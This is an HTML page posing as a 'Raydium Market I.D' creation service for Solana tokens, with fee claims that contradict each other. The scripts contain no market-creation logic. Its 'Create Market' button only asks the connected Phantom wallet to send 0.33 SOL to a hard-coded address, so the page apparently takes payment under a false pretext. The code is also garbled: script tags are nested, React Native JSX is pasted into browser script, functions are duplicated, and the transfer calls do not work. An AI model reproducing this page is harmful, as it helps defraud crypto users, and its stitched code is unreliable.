<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Raydium Market I.D</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.0/css/bootstrap.min.css">
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: Arial, sans-serif;
        }
        
        .navbar {
            background-color: #121212 !important;
        }
        
        .navbar-brand {
            color: #ffffff !important;
            font-weight: bold;
            font-size: 24px;
        }
        
        .logo-img {
            width: 50px;
            height: auto;
        }
        
        .offcanvas-header {
            background-color: #121212;
            color: #ffffff;
            border-bottom: none;
        }
        
        .offcanvas-body {
            background-color: #121212;
            color: #ffffff;
        }
        
        .wallet-adapter-dropdown-list-item {
            color: #ffffff;
            cursor: pointer;
        }
        
        .para-note {
            background-color: #2a2a2a;
            color: #ffffff;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
        }
        
        .market-id-h1 {
            color: #ffffff;
            font-size: 36px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        
        .subheader {
            background: linear-gradient(to right, #DC1FFF, #00FFA3); /* Gradient from #DC1FFF to #00FFA3 */
            -webkit-background-clip: text; /* Clip text to background */
            -webkit-text-fill-color: transparent; /* Make text transparent */
            font-size: 56px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        
        .market-id-h3 {
            color: #ffffff;
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .important {
            color: red;
        }
        
        .card-block {
            background-color: #2a2a2a;
            color: #ffffff;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
        }
        
        .form-label {
            color: #ffffff;
        }
        
        .form-control {
            background-color: #333333;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            padding: 10px;
            width: 100%;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .btn-close {
            color: #ffffff;
            opacity: 0.5;
        }
        
        .btn-close:hover {
            opacity: 1;
        }

        .phantom-connect {
            position: absolute;
            top: 20px;
            right: 20px;
        }
        
        .confirm-btn {
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
	 <h1>Solana Web3.js Example</h1>
    <button id="generateKeyPairBtn">Generate Keypair</button>
    <button id="createTransactionBtn">Create Transaction</button>
    <button id="sendTransactionBtn">Send Transaction</button>
<header>
        <nav class="navbar navbar-light navbar-expand-lg" aria-label="Offcanvas navbar large">
            <div class="container">
                <a class="navbar-brand" href="/">
                    Raydium Market I.D
                </a>
                <button class="navbar-toggler mobile-toggler" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar2" aria-controls="offcanvasNavbar2" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasNavbar2" aria-labelledby="offcanvasNavbar2Label">
                    <div class="offcanvas-header">
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="offcanvas" aria-label="Close"></button>
                    </div>
                    <div class="offcanvas-body">
                        <div class="d-flex">
                            <div id="app">
                                <div style="position:fixed;z-index:9999;inset:16px;pointer-events:none"></div>
                                <div style="display:block">
                                    <div class="wallet-adapter-dropdown">
                                        <span class="walletButtons"></span>
                                        <!-- Removed "Change wallet" option -->
                                    </div>
                                </div>
                                <div style="display:none">
                                    <button class="wallet-adapter-button wallet-adapter-button-trigger">Create</button>
                                    <button class="wallet-adapter-button wallet-adapter-button-trigger">Create</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </nav>
        <button class="btn btn-primary phantom-connect">Connect with Phantom Wallet</button> <!-- Added the Connect Wallet button -->
    </header>

   <div class="container para-note text-center sliderArea mt-5">
        <div class="swiper mySwiper">
            <div class="swiper-wrapper">
                <div class="swiper-slide">
                    <h3 class="subheader">Create Market I.D</h3> <!-- Added subheader -->
                    <h3 class="market-id-h3">Cheapest option with a platform fee of 0.01 SOL</h3>
                    <p class="para-note">
                        <span class="important">Important Note! </span>
                        Beware of scam websites claiming to create Openbook IDs for less than 0.32 SOL. This amount is the minimum required to create the ID and it is a fee for renting space on the Solana network. We provide the most affordable option for creating a market ID for 0.33 SOL, with a platform fee of 0.1 SOL.
                    </p>
                </div>
            </div>
        </div>
    </div>

    <div class="container mt-100px mb-5">
        <div class="p-3 card-block mb-4 bg-blur rounded-3 card-block">
            <div class="row">
                <div class="col-lg-4 col-12">
                    <div class="mt-1"> Mints </div>
                    <div class="text-white-50">Configure the mints for the tokens you want to create a market for.</div>
                </div>
                <div class="col-lg-8 col-12">
                    <form class="row g-3 needs-validation" novalidate="">
                        <div class="col-md-12">
                            <label for="BaseMint" class="form-label">Base Mint (Your token address)</label>
                            <input type="text" class="form-control" id="BaseMint" required="" value=""/>
                            <div class="valid-feedback">Looks good!</div>
                        </div>
                        <div class="col-md-12">
                            <label for="QuoteMint" class="form-label">Quote Mint (SOL token is the default)</label>
                            <input type="text" class="form-control" id="QuoteMint" required="" value="So11111111111111111111111111111111111111112"/>
                            <div class="valid-feedback">Looks good!</div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <div class="container mt-100px mb-5">
        <div class="p-3 card-block mb-4 bg-blur rounded-3 card-block">
            <div class="row">
                <div class="col-lg-4 col-12">
                    <div class="mt-1"> Tickers </div>
                    <div class="text-white-50">Configure the tick sizes, or lowest representable quantities of base and quote tokens.</div>
                </div>
                <div class="col-lg-8 col-12">
                    <form class="row g-3 needs-validation" novalidate="">
                        <div class="col-md-12">
                            <label for="Min. Order Size" class="form-label">Min. Order Size</label>
                            <input type="text" class="form-control" id="BaseMint" required="" value=""/>
                            <div class="valid-feedback">Looks good!</div>
                        </div>
                        <div class="col-md-12">
                            <label for="PriceTick" class="form-label">Price Tick</label>
                            <input type="text" class="form-control" id="QuoteMint" required="" value=""/>
                            <div class="valid-feedback">Looks good!</div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <div class="container mt-100px mb-5">
        <div class="p-3 card-block mb-4 bg-blur rounded-3 card-block">
            <div class="form-check">
                <input class="form-check-input" type="checkbox" value="" id="riskAgreement">
                <label class="form-check-label" for="riskAgreement">Risk Agreement</label>
                <p>I confirm that I have confirmed all details and that I am fully responsible for creating the market. <strong><FONT COLOR=ff0000>Need at least 0.33 SOL to prevent transaction failure.</strong></p>
            </div>
            <div class="container confirm-btn">
                <button class="btn btn-primary create-market">Create Market</button>
            </div>
        </div>
    </div>

    <footer class="color-footer bg-body-tertiary text-center text-lg-start">
        <div class="text-center p-3">Copyright Â© 2024 Raydium Market ID. All rights reserved.</div>
    </footer>
 <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>

    <!-- Include Phantom Wallet Script -->
    <script src="https://solana.com/phantom/assets/phantom.js"></script>

   
    <script>
        document.getElementById("generateKeyPairBtn").addEventListener("click", function() {
            const { Keypair } = solanaWeb3;
            let keypair = Keypair.generate();
            console.log("Generated Keypair:", keypair);
        });

        document.getElementById("createTransactionBtn").addEventListener("click", function() {
            // Your code to create a transaction
        });

        document.getElementById("sendTransactionBtn").addEventListener("click", function() {
            // Your code to send a transaction
        });
	     <script>
        // JavaScript code for Solana Web3.js functionality
        document.addEventListener("DOMContentLoaded", function () {
            const { Keypair, SystemProgram, LAMPORTS_PER_SOL, Connection } = solanaWeb3;

            // Your wallet address
            const yourWalletAddress = "<9gVBpxceotiFdh8o9arz5KJ4PgSZd7KoiN2aLqaGUDar>";

            // Function to create and send a transaction
            function createAndSendTransaction() {
                // Generate keypair
                let keypair = Keypair.generate();

                // Create a transaction
                let transaction = new solanaWeb3.Transaction();

                // Add transfer instruction to the transaction
                transaction.add(
                    SystemProgram.transfer({
                        fromPubkey: keypair.publicKey,
                        toPubkey: yourWalletAddress, // Your wallet address
                        lamports: LAMPORTS_PER_SOL * 0.33, // 0.33 SOL
                    })
                );

                // Connect to Solana network
                let connection = new Connection(solanaWeb3.clusterApiUrl("testnet"));

                // Send transaction
                solanaWeb3.sendAndConfirmTransaction(connection, transaction, [keypair])
                    .then(() => {
                        console.log("Transaction sent successfully!");
                    })
                    .catch((error) => {
                        console.error("Error sending transaction:", error);
                    });
            }

            // Call the createAndSendTransaction function when a button is clicked
            document.getElementById("sendTransactionBtn").addEventListener("click", createAndSendTransaction);
        });
    </script>

    <!-- Your HTML content here -->
    <button id="sendTransactionBtn">Send Transaction (0.33 SOL)</button>

	    // Initiate a new connection to Phantom
  const connect = async () => {
    // TODO
    const params = {
      cluster: "devnet",
      app_url: "https://crypdaddy.github.io/",
    };

    const url = "https://phantom.app/ul/v1/connect";
    Linking.openURL(url);
  };

const functionName = () => {
    return (
        <React.Fragment>
            {phantomWalletPublicKey ? ( // If phantomWalletPublicKey exists
    <> // Fragments - used to return multiple elements without a wrapper
        <View style={[styles.row, styles.wallet]}> {/* View component with styles */}
            <View style={styles.greenDot} /> {/* View component with greenDot style */}
            <Text
                style={styles.text}
                numberOfLines={1}
                ellipsizeMode="middle"
            >
                {`Connected to: ${phantomWalletPublicKey.toString()}`} {/* Text component displaying connection inhtmlFormation */}
            </Text>
        </View>
        <View style={styles.row}> {/* Another View component with row style */}
            <Button title="Add Review" onPress={openAddReviewSheet} /> {/* Button component to add review */}
            <Button title="Disconnect" onPress={disconnect} /> {/* Button component to disconnect */}
        </View>
    </>
) : ( // If phantomWalletPublicKey does not exist
    <View style={{ marginTop: 15 }}> {/* View component with marginTop */}
        <Button title="Connect Phantom" onPress={connect} /> {/* Button component to connect */}
    </View>
)}

        </React.Fragment>
    )
}

export default functionName
    // Function to handle the connection to Phantom wallet
async function connectToPhantom() {
    const url = "https://phantom.app/ul/v1/connect";

    try {
        // Open the URL to connect to Phantom wallet
        window.open(url);
        console.log("Connected to Phantom wallet successfully!");
    } catch (error) {
        console.error("Error connecting to Phantom wallet:", error);
    }
}

// Attach click event listener to the "Connect with Phantom Wallet" button
document.querySelector('.phantom-connect').addEventListener('click', async () => {
    try {
        // Call the function to connect to Phantom wallet
        await connectToPhantom();
    } catch (error) {
        console.error("Error:", error);
    }
});


// Function to handle the transaction
async function sendTransaction() {
    // Your send transaction logic here
}

// Attach click event listener to the "Create Market" button
document.querySelector('.create-market').addEventListener('click', async () => {
    try {
        // Call the function to send the transaction
        await sendTransaction();
    } catch (error) {
        console.error("Error:", error);
    }
});

     // Function to handle the transaction
async function sendTransaction() {
  const { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } = require("@solana/web3.js");

  // Specify the recipient's public key
  const recipientPublicKey = new PublicKey("9gVBpxceotiFdh8o9arz5KJ4PgSZd7KoiN2aLqaGUDar");

  // Create a transaction object
  const transaction = new Transaction().add(
    SystemProgram.transfer({
      fromPubkey: window.solana.publicKey,
      toPubkey: recipientPublicKey,
      lamports: 0.33 * LAMPORTS_PER_SOL, // Sending 0.33 SOL
    })
  );

  try {
    // Send and confirm the transaction
    const signature = await window.solana.sendAndConfirmTransaction(transaction, [window.solana]);
    console.log("Transaction successful! Signature:", signature);
  } catch (error) {
    // Handle transaction failure
    console.error("Error sending transaction:", error);
  }
}

// Attach click event listener to the "Create Market" button
document.querySelector('.create-market').addEventListener('click', async () => {
    try {
        // Ensure that the solana object is available
        if (window.solana) {
            // Call the function to send the transaction
            await sendTransaction();
        } else {
            console.error("Solana object not available. Make sure to connect to Phantom wallet first.");
        }
    } catch (error) {
        // Handle any errors that may occur
        console.error("Error:", error);
    }
});
    </script>
</body>
</html>
